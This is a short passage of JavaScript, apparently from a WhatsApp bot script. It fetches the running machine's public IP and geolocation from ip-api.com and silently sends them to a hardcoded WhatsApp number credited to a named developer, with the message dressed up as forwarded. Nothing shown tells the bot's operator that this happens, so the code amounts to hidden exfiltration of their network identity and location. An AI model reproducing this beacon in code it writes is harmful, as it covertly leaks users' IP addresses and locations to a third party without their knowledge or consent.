...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       hyper.sendMessage("94786825798@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer ChamodKeshan",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94786825798?text=welcome"}}})
